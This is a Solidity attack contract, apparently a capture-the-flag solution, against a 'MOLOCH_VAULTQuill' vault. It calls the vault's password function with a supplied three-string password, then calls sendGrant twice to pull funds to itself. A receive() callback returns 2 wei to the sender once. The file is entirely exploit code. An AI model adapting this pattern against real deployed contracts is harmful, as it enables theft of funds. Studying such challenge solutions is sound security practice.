// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
import "./MolochVault.sol";

contract MOLOCH_VAULTQuillAttack {
    bool public flag;
    function attack(address payable target, string[3] memory pass) public payable {
        MOLOCH_VAULTQuill targetContract = MOLOCH_VAULTQuill(target);
        targetContract.uhER778(pass);
        targetContract.sendGrant(payable(address(this)));
        targetContract.sendGrant(payable(address(this)));
    }

    receive() external payable {
        if (flag == false) {
            flag = true;
            (bool success, ) = address(msg.sender).call{value:2 wei}("");
            require(success);
        }
    }
}